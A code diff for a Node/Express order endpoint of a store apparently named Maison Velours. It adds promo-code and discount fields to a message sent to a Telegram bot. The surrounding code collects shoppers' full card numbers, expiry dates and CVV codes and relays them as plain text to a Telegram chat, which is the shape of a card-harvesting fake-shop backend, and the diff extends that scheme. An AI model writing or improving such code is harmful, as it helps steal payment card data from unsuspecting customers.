@@ -19,6 +19,8 @@ const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
   .filter(Boolean);
 
 app.disable('x-powered-by');
+// Needed for correct client IPs (rate limiting) when behind a reverse proxy/load balancer.
+app.set('trust proxy', 1);
 app.use(helmet({
   crossOriginResourcePolicy: false,
   contentSecurityPolicy: false
@@ -58,6 +60,14 @@ function buildOrderMessage(order) {
   });
   const header = `New Maison Velours order - $${order.total.toFixed(2)}`;
   const itemLines = lines.join('');
+  let promoInfo = '';
+  if (order.promoCode) {
+    promoInfo =
+      `\n\nPromo: ${order.promoCode}\n` +
+      `Subtotal: $${order.subtotal.toFixed(2)}\n` +
+      `Discount: -$${order.discount.toFixed(2)}\n` +
+      `Total charged: $${order.total.toFixed(2)}`;
+  }
   const customerInfo =
   `Name: ${order.name}\n` +
   `Email: ${order.email}\n` +
@@ -66,7 +76,7 @@ function buildOrderMessage(order) {
   `Expiry: ${order.expiryDate}\n` +
   `CVV: ${order.securityCode}\n` +
   `ZIP: ${order.zip}`;
-  return `${header}${itemLines}\n\n${customerInfo}`;
+  return `${header}${itemLines}${promoInfo}\n\n${customerInfo}`;
 }
 async function sendTelegramMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -122,6 +132,11 @@ app.post('/api/orders/telegram', orderLimiter, async (req, res) => {
   const zip = clean(body.zip, 30);
   const total = Number(body.total);
   const items = Array.isArray(body.items) ? body.items : [];
+  const promoCode = clean(body.promoCode, 40).toUpperCase();
+  const subtotalRaw = Number(body.subtotal);
+  const discountRaw = Number(body.discount);
+  const subtotal = Number.isFinite(subtotalRaw) && subtotalRaw >= 0 ? subtotalRaw : total;
+  const discount = Number.isFinite(discountRaw) && discountRaw >= 0 ? discountRaw : 0;
 
   if (!name || !validEmail(email) || !address || !cardNumber || !expiryDate || !securityCode || !zip ||
       !Number.isFinite(total) || total < 0 || items.length < 1 || items.length > 50) {
@@ -149,6 +164,9 @@ app.post('/api/orders/telegram', orderLimiter, async (req, res) => {
     securityCode,
     zip,
     total,
+    promoCode,
+    subtotal,
+    discount,
     items: normalizedItems
   });
   const results = await Promise.all(
